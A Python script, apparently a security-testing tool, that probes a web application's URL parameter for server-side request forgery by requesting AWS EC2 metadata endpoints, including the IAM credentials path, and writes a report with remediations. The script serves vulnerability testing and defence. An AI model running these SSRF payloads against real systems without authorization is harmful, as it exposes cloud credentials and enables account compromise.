#!/usr/bin/env python3
"""
AWS Metadata Service Tester
Tests for AWS EC2 metadata service exposure (SSRF vulnerability).
"""

import sys
import requests
from typing import Dict

class AWSMetadataTester:
    def __init__(self, url: str):
        self.url = url
        self.metadata_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/meta-data/public-keys/'
        ]
        self.vulnerable = False
        self.findings = []
    
    def test_metadata_access(self, param: str) -> Dict:
        """Test for AWS metadata service access via SSRF"""
        print(f"[*] Testing AWS metadata service access...")
        
        results = {
            'accessible': False,
            'endpoints': []
        }
        
        for endpoint in self.metadata_endpoints:
            try:
                # Test via URL parameter
                response = requests.get(
                    self.url,
                    params={param: endpoint},
                    timeout=5,
                    allow_redirects=False
                )
                
                # Check if metadata content is returned
                if 'instance-id' in response.text or 'ami-id' in response.text:
                    print(f"[+] AWS metadata accessible via: {endpoint}")
                    results['accessible'] = True
                    results['endpoints'].append(endpoint)
                    self.vulnerable = True
            except:
                pass
        
        return results
    
    def generate_report(self) -> str:
        """Generate AWS metadata test report"""
        report = f"# AWS Metadata Service Test Report for {self.url}\n\n"
        
        if self.vulnerable:
            report += "⚠️ **CRITICAL**: AWS metadata service is accessible!\n\n"
            report += "This indicates a potential SSRF vulnerability that could lead to:\n"
            report += "- Access to IAM credentials\n"
            report += "- Instance metadata exposure\n"
            report += "- Potential cloud account compromise\n\n"
        else:
            report += "✅ AWS metadata service is not accessible.\n\n"
        
        report += "## Tested Endpoints\n\n"
        for i, endpoint in enumerate(self.metadata_endpoints, 1):
            report += f"{i}. `{endpoint}`\n"
        report += "\n"
        
        report += "## Impact\n\n"
        report += "If metadata service is accessible, attackers can:\n"
        report += "1. Retrieve IAM role credentials\n"
        report += "2. Access instance metadata\n"
        report += "3. Potentially escalate to cloud account compromise\n\n"
        
        report += "## Recommendations\n\n"
        report += "1. Block access to metadata service (169.254.169.254)\n"
        report += "2. Implement proper input validation\n"
        report += "3. Use whitelist for allowed URLs\n"
        report += "4. Implement network segmentation\n"
        report += "5. Use IAM roles with least privilege\n\n"
        
        return report

def main():
    if len(sys.argv) < 3:
        print("Usage: python aws_metadata_tester.py <url> <parameter>")
        print("Example: python aws_metadata_tester.py http://example.com/fetch url")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    tester = AWSMetadataTester(url)
    tester.test_metadata_access(param)
    
    report = tester.generate_report()
    
    filename = "aws_metadata_test_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] AWS metadata testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()

